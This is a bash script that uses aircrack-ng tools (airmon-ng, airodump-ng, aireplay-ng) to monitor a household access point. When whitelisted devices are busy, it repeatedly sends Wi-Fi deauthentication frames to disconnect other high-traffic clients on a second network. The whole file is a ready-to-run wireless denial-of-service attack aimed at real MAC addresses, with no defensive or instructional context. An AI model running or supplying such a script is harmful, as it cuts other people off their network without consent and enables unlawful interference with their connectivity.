#!/bin/bash
AP_MAC="20:76:93:30:a8:b0"
AP_MAC2="f0:98:38:b8:d7:ec"
THRESHOLD="500"
GOODNB_DIR="/tmp/goodnb/"
AIRDUMP_FILE_PREFIX="${GOODNB_DIR}airodump"
AIRDUMP_FILE="${AIRDUMP_FILE_PREFIX}-01.csv"
MAC_PACKETS_FILE="${GOODNB_DIR}mac-packets"
WHITELIST_FILE="/root/goodnb.whitelist"
KEEP_RUNNING="yes"

function is_dad_busy()
{
	airmon-ng start wlan0 6
	# clean and prepare tmp dir
	if [ -e ${GOODNB_DIR} ]
	then
		rm -rf ${GOODNB_DIR}
	fi
	mkdir ${GOODNB_DIR}
	# get mac and number of packets
	timeout --foreground 3 airodump-ng  wlan0mon --bssid ${AP_MAC2} --channel 6  --output-format csv  --write ${AIRDUMP_FILE_PREFIX} && sleep 2

	airmon-ng stop wlan0mon

	TARGETS=`awk '/Station MAC/{for(i=0;i<NR;i++){getline; printf "%s, %s\n",$1,$7}}' ${AIRDUMP_FILE} | tr -d "," | tr -d "\r"` &&\

	printf %s "${TARGETS}" > ${MAC_PACKETS_FILE}
	sed -i '/^ /d' ${MAC_PACKETS_FILE}

	while IFS=$' ' read -r -a LINE
	do
		MAC=${LINE[0]}
		CNT=${LINE[1]}
		iswhite=`grep -i ${MAC} ${WHITELIST_FILE} | wc -l`
		if [ ${iswhite} != "0" ]; then
			if [ "${CNT}" -ge "$THRESHOLD" ]
			then
				return 1
			fi
		fi
	done < ${MAC_PACKETS_FILE}
}

while [ ${KEEP_RUNNING}=="yes" ]; do

is_dad_busy
if [ $? -eq 1 ]
then
	echo "dad is busy, attack in 3 sec"
else
	echo "dad is happy, no attacking"
	continue
fi
sleep 3

# setup monitor mode
airmon-ng start wlan0 1

# clean and prepare tmp dir
if [ -e ${GOODNB_DIR} ]
then
	rm -rf ${GOODNB_DIR}
fi
mkdir ${GOODNB_DIR}

# get mac and number of packets
timeout --foreground 3 airodump-ng  wlan0mon --bssid ${AP_MAC} --channel 1  --output-format csv  --write ${AIRDUMP_FILE_PREFIX} && sleep 2

TARGETS=`awk '/Station MAC/{for(i=0;i<NR;i++){getline; printf "%s, %s\n",$1,$7}}' ${AIRDUMP_FILE} | tr -d "," | tr -d "\r"` &&\

printf %s "${TARGETS}" > ${MAC_PACKETS_FILE}
sed -i '/^ /d' ${MAC_PACKETS_FILE}

# find the most noisy neighbour and attack
while IFS=$' ' read -r -a LINE
do
	MAC=${LINE[0]}
	CNT=${LINE[1]}
	iswhite=`grep -i ${MAC} ${WHITELIST_FILE} | wc -l`
	if [ ${iswhite} != "0" ]; then
		continue
	fi
	if [ "${CNT}" -ge "$THRESHOLD" ]
	then
		echo "deauthing ${MAC} ${CNT}"
		aireplay-ng -0 25 -a ${AP_MAC} -c ${MAC} wlan0mon
	fi
done < ${MAC_PACKETS_FILE} && sleep 10

airmon-ng stop wlan0mon
done
